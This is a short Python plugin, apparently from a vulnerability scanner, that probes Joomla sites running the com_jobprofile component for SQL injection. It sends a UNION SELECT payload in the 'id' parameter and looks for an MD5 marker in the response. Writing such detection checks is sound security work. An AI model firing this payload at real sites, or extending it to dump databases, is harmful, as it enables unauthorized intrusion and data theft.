#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__author__ = 'pyphrb'

def assign(service, arg):
    if service == "joomla":
        return True, arg

def audit(arg):
    url = arg
    _, head, body, _, _ = curl.curl(url + '/index.php?option=com_jobprofile&Itemid=61&task=profilesview&id=-1+union+all+select+1,concat_ws(0x3a,0x3a,md5(3.1415),0x3a),3,4,5,6,7,8,9')
    if body and body.find('63e1f04640e83605c1d177544a5a0488') != -1:
        security_hole(url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('joomla', 'http://www.example.com/')[1])
